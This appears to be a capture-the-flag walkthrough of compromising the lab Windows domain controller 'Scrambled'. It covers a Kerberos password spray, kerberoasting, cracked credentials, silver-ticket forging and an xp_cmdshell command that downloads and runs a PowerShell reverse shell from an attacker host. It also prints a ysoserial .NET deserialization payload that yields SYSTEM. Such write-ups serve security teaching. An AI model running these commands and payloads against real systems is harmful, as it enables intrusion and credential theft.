; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;scrm.local.                    IN      ANY

;; ANSWER SECTION:
scrm.local.             600     IN      A       10.10.11.168
scrm.local.             3600    IN      NS      dc1.scrm.local.
scrm.local.             3600    IN      SOA     dc1.scrm.local. hostmaster.scrm.local. 147 900 600 86400 3600
scrm.local.             600     IN      AAAA    dead:beef::22b
scrm.local.             600     IN      AAAA    dead:beef::e8d5:d30b:5425:3741

;; ADDITIONAL SECTION:
dc1.scrm.local.         1200    IN      A       10.10.11.168
dc1.scrm.local.         1200    IN      AAAA    dead:beef::e8d5:d30b:5425:3741
dc1.scrm.local.         1200    IN      AAAA    dead:beef::22b

;; Query time: 47 msec
;; SERVER: 10.10.11.168#53(10.10.11.168) (TCP)
;; WHEN: Sat Dec 23 10:55:18 CET 2023
;; MSG SIZE  rcvd: 248
```

### Port 80

Enumerating the site we found that there is a mention of a password reset policy. It is possible that there are users whose password is their username. Fuzzing don’t get us to something.

In the webpage we can see a user name in a screenshot. We can test his password against kerberos. 

### Port 445

- SMB
- Access Denied

```bash
┌──(kali㉿kali)-[~/machines/windows/scrambled]
└─$ smbclient -L \\\\dc1.scrm.local\\ -N                                             
session setup failed: NT_STATUS_NOT_SUPPORTED
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/machines/windows/scrambled]
└─$ smbclient -L \\\\10.10.11.168\\ -N  
session setup failed: NT_STATUS_NOT_SUPPORTED
```

### Port 139

- RPC
- Acces Denied
    
    ```bash
    ┌──(kali㉿kali)-[~/machines/windows/scrambled]
    └─$ rpcclient -U "" -N 10.10.11.168 
    Cannot connect to server.  Error was NT_STATUS_NOT_SUPPORTED
                                                                                                                                                                                                                                                
    ┌──(kali㉿kali)-[~/machines/windows/scrambled]
    └─$ rpcclient -U "" -N dc1.scrm.local
    Cannot connect to server.  Error was NT_STATUS_NOT_SUPPORTED
    ```
    

# Enumerating with credentials - ksimpson

We can test ksimpson password againts kerberos.

```bash
┌──(kali㉿kali)-[~/machines/windows/scrambled]
└─$ kerbrute passwordspray --dc 10.10.11.168 -d scrm.local user.txt ksimpson

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/23/23 - Ronnie Flathers @ropnop

2023/12/23 11:52:34 >  Using KDC(s):
2023/12/23 11:52:34 >   10.10.11.168:88

2023/12/23 11:52:34 >  [+] VALID LOGIN:      KSIMPSON@scrm.local:ksimpson
2023/12/23 11:52:34 >  Done! Tested 8 logins (1 successes) in 0.285 seconds
```

Since NTLM is disable we can try a kerberoasting attack.

```bash
┌──(kali㉿kali)-[~/machines/windows/scrambled]
└─$ impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k -request 
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 17:32:02.351452  2023-12-23 10:39:40.327556             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 17:32:02.351452  2023-12-23 10:39:40.327556             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$13d8a97e841923c2eb0b0071060c710c$992a6abc4b52c6d0eb372f6893a515c62ccf14a0a8f0ee2221d62bd233a5f8aa123b4eff30a65d8d15a7fccee2e84a26a9859bdb034f0a1dfb633cd3d32b51e713fcdffc56a2a2afcaa5665129d04f64af75f7623d3e5910d811a8b6caceb55379ce5bddbabee6620bec33cfa4089c11d6546e301d244170506d2369e72b1d807392bf004947541c89feeeea000d3f34473650e4a255d345185fc6348ee070187006872e48d742e5193ce51e0a11b5d1389531cf10e73fdc80e12e78cc9fa61dab10d9719ce99ec4dd5f18107dc21dfdcc136b29dd62ec81b72894e075f860516852a2b5a26257c87d236c94e1226af60fce1f39af2b410ed99943cfff7ffcd6b0cacd936068e47aaa409184cf2501b87d5c063f2e50ee7cd03067ef56f5adf39fe13b7c93696aeabac6fd6844ac7b9c3c05d46d8b5c6fd0ca131208d063a15de17449eab26e364ab991a3ef937be5e9a449356df3083edd1da6cd7e2363db31dd4c4e274bf86bb8aac625d8189bb464eccfbfc44792730cca048bb75b7c731e950048ea716293dd05cb23d92664225bfbe489891138d23587246941aa06093060c5461fd1babda0a6e9bdc11c181b6170a86794ed029939537fe037714ed2ec30925ad5d56aed99219c51e53f1e7a315c06c6072cd6e7bd74b89a9f54c60174cff0be0fd107430087269fdb1e1833a6c50263a1222f0c8e322dce627bb576959d5c166e8f1bc89e07f4d928ce847baafad5061daac9b0e2b1cf58c9e7b6bfa21cb93cd7591ed1c0e45de7dcde2babb18d222150dfb372f7ddc649b8ba4513fee9d15d82e6786d916b8411ca31ce3e8593460dda3f0ac73f4822e130f9c8387044993c230ecfa487e4d37837094226e0b276d5f075fa079aa562ed9f64775cdf0459cd2e0431506708fbbe52b888d17314c7eeacfc712c897303a31d6480508ea987712de28e73a6690e3f7467f2f48fcfdaf25f8d3ae2fb52a132ad00fccbf62d2d80a4ffe3e12d7b63ad31b14a805ef9bc2f1b599cef6b7418b0a278e5b22f033a230e81346ab4766332b8e89a8fe4548d7654bf94b7cf494f43beb638d3de988541da302870ea2201c488819013a02326a4d4e672bb3c499299d00cd6842c2c91aef578f37b85b2f9adcc78c9707d20507bd1c62e47584331364b916684351fa40cff96c4564fca460e7a23ef53326a11ea391d0235e1a9afd93b4d10bc263e436a4144762af31b8cc723dc2f4560a27009027cbb2da66c1ddc0f7400b1a8eca9ca0c33a76746ea97908a170e29dd5c3ee9d9110116962761337750ed96ad38a48c7a1c3de5b9dce5f556eb862bbf9d8dfd16ba97503a64ba6733c013ff6bffcdcebd64ac3656f4f8267d9b61949fe1b84551646644b27c99b59f38a857b74c916f4c82ee601cc473bad881d613290b16c468e3c0b5f9c694e7
```

We obtain a crackable hash for the user `sqlsvc` . Using hashcat we obtain the credentials → `sqlsvc:Pegasus60` .

# Silver ticket attack

Since we have the credentials of a user running a service, we are in a position to performa silver ticket attack to connect to that service.

We can try to connect to MSSQL with `sqlsvc` and `ksimpson` users, requesting tickets for them, but won’t work. Instead, we can try to connect as administrator user.

We need the following:

- NTLM hash of the password
    - `Pegasus60 → B999A16500B87D17EC7F2E2A68778F05`
- SPN of the service
    - We obtained it via Kerberoasting attack → SQLSvc/dc1.scrm.local
- SID of the domain
    - WE can use impacket-pac → `S-1-5-21-2743207045-1827831105-2542523200`

With all this we can generate a TGS for any user in the domain to connnect to the MSSQL database.

 We create the ticket.

```bash
┌──(kali㉿kali)-[~/machines/windows/scrambled]
└─$ impacket-ticketer -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn SQLSvc/dc1.scrm.local Administrator
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

We connect to the service.

```bash
┌──(kali㉿kali)-[~/machines/windows/scrambled]
└─$ KRB5CCNAME=Administrator.ccache impacket-mssqlclient -k -no-pass scrm.local/Administrator@dc1.scrm.local
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)>
```

Enumerating the database we get a new user and a password.

```bash
SQL (SCRM\administrator  dbo@ScrambleHR)> select * FROM Employees;
EmployeeID   FirstName   Surname   Title   Manager   Role   
----------   ---------   -------   -----   -------   ----   
SQL (SCRM\administrator  dbo@ScrambleHR)> select * FROM UserImport;
LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   
--------   -----------------   ----------   ---------------   -------------   
MiscSvc    ScrambledEggs9900   scrm.local                90               0
```

Credentials → `MiscSvc:ScrambledEggs9900`

In addition we can execute commands, so let’s get a reverse shell.

```bash
SQL (SCRM\administrator  dbo@master)> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.14/Invoke-PowerShellTcp.ps1") | powershell -noprofile'
```

And we get a shell in the listener.

```bash
┌──(kali㉿kali)-[~/machines/windows/scrambled]
└─$ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.11.168] 60822
Windows PowerShell running as user sqlsvc on DC1
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
scrm\sqlsvc
```

# Strange process runnning in the machine

If we list the services or the tasks runnning in the machine, will notice a strange server running in port 4411. If we connect with netcat to this server will see that is a software to register sales. 

As the user miscsvc we can connect to the IT share, where we will obtain a .exe and a .dll file. This are the files used to connecet to this server. Now, with dnSpy we can check the source code to see how exactly this client works and how it communicates with the server.

```bash
PS C:\Shares\IT\APPs\Sales Order Client> dir

    Directory: C:\Shares\IT\APPs\Sales Order Client

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       05/11/2021     20:52          86528 ScrambleClient.exe                                                    
-a----       05/11/2021     20:52          19456 ScrambleLib.dll
```

Basically it it using a object used to deserialize and serialize binary data. 

![Untitled](Scrambled%20922759135504445a809f388c0fb5018f/Untitled.png)

If we enable logging in the application will see how exactly this serialize data is sended to the server.

![Untitled](Scrambled%20922759135504445a809f388c0fb5018f/Untitled%201.png)

With all this we can create a serialized object, that upon deserialization, will trigger a RCE. WE can use ysoserial for this.

```bash
.\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c 'ping 10.10.14.14'
AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA1AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBdndVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUhCcGJtY2dNVEF1TVRBdU1UUXVNVFFpSUZOMFlXNWtZWEprUlhKeWIzSkZibU52WkdsdVp6MGllM2c2VG5Wc2JIMGlJRk4wWVc1a1lYSmtUM1YwY0hWMFJXNWpiMlJwYm1jOUludDRPazUxYkd4OUlpQlZjMlZ5VG1GdFpUMGlJaUJRWVhOemQyOXlaRDBpZTNnNlRuVnNiSDBpSUVSdmJXRnBiajBpSWlCTWIyRmtWWE5sY2xCeWIyWnBiR1U5SWtaaGJITmxJaUJHYVd4bFRtRnRaVDBpWTIxa0lpQXZQZzBLSUNBZ0lDQWdQQzl6WkRwUWNtOWpaWE56TGxOMFlYSjBTVzVtYno0TkNpQWdJQ0E4TDNOa09sQnliMk5sYzNNK0RRb2dJRHd2VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJK0N3PT0L
```

When we send this to the server we receive for pings from the machine.

```bash
UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA1AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBdndVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUhCcGJtY2dNVEF1TVRBdU1UUXVNVFFpSUZOMFlXNWtZWEprUlhKeWIzSkZibU52WkdsdVp6MGllM2c2VG5Wc2JIMGlJRk4wWVc1a1lYSmtUM1YwY0hWMFJXNWpiMlJwYm1jOUludDRPazUxYkd4OUlpQlZjMlZ5VG1GdFpUMGlJaUJRWVhOemQyOXlaRDBpZTNnNlRuVnNiSDBpSUVSdmJXRnBiajBpSWlCTWIyRmtWWE5sY2xCeWIyWnBiR1U5SWtaaGJITmxJaUJHYVd4bFRtRnRaVDBpWTIxa0lpQXZQZzBLSUNBZ0lDQWdQQzl6WkRwUWNtOWpaWE56TGxOMFlYSjBTVzVtYno0TkNpQWdJQ0E4TDNOa09sQnliMk5sYzNNK0RRb2dJRHd2VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLUEM5UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJK0N3PT0L
ERROR_GENERAL;Error deserializing sales order: Exception has been thrown by the target of an invocation.
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -i tun0 icmp
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
06:00:02.400724 IP 10.10.11.168 > 10.10.14.14: ICMP echo request, id 1, seq 1, length 40
06:00:02.400791 IP 10.10.14.14 > 10.10.11.168: ICMP echo reply, id 1, seq 1, length 40
06:00:03.419994 IP 10.10.11.168 > 10.10.14.14: ICMP echo request, id 1, seq 2, length 40
06:00:03.420023 IP 10.10.14.14 > 10.10.11.168: ICMP echo reply, id 1, seq 2, length 40
06:00:04.434874 IP 10.10.11.168 > 10.10.14.14: ICMP echo request, id 1, seq 3, length 40
06:00:04.434896 IP 10.10.14.14 > 10.10.11.168: ICMP echo reply, id 1, seq 3, length 40
06:00:05.450857 IP 10.10.11.168 > 10.10.14.14: ICMP echo request, id 1, seq 4, length 40
06:00:05.450879 IP 10.10.14.14 > 10.10.11.168: ICMP echo reply, id 1, seq 4, length 40
```

Now we simply has to trigger a reverse shell and we have administrator access to the box.

```bash
PS C:\Users\Administrator> whoami
nt authority\system
```